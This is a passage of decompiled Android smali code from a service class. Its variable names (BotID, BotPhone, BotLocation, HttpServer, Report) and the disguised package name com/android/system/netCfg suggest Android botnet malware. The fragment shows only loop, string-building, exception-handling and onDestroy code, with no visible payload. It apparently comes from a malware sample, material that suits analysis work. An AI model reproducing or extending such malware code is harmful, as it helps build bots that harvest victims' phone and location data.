    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    .line 159
    :cond_e
    add-int/lit8 v26, v26, 0x1

    goto :goto_4

    .line 81
    .end local v8    # "AA":Lcom/android/system/netCfg;
    .end local v9    # "Apps":Ljava/lang/String;
    .end local v10    # "BotID":Ljava/lang/String;
    .end local v11    # "BotLocation":Ljava/lang/String;
    .end local v12    # "BotNetwork":Ljava/lang/String;
    .end local v13    # "BotPhone":Ljava/lang/String;
    .end local v14    # "BotPrefix":Ljava/lang/String;
    .end local v15    # "BotVer":Ljava/lang/String;
    .end local v16    # "Detect":[Ljava/lang/String;
    .end local v17    # "HttpServer":Ljava/lang/String;
    .end local v19    # "Report":Ljava/lang/String;
    .end local v23    # "o":I
    .end local v26    # "x":I
    :catch_0
    move-exception v2

    goto/16 :goto_0

    .line 79
    :catch_1
    move-exception v2

    goto/16 :goto_0
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 287
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 289
    return-void
.end method
